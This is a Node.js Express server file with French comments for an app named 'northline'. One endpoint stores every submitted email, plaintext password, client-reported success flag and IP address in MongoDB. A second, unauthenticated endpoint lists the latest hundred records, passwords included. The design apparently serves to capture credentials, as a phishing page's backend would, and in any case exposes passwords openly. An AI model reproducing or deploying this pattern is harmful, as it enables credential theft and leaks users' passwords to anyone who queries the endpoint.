const express = require("express");
const mongoose = require("mongoose");
const path = require("path");

const LoginAttempt = require("./models/LoginAttempt");

const app = express();
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI || "mongodb://localhost:27017/northline";

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// API : enregistrer une tentative de connexion
app.post("/api/login-attempt", async (req, res) => {
  try {
    const { email, password, success } = req.body;
    const attempt = await LoginAttempt.create({
      email,
      password,
      success,
      ip_address: req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown",
    });
    res.json({ ok: true, id: attempt._id });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

// API : lister les tentatives de connexion
app.get("/api/login-attempts", async (req, res) => {
  try {
    const attempts = await LoginAttempt.find().sort({ attempted_at: -1 }).limit(100);
    res.json(attempts);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

mongoose
  .connect(MONGO_URI)
  .then(() => {
    console.log("MongoDB connecte");
    app.listen(PORT, () => console.log(`Serveur demarre sur http://localhost:${PORT}`));
  })
  .catch((err) => {
    console.error("Erreur MongoDB:", err.message);
    process.exit(1);
  });
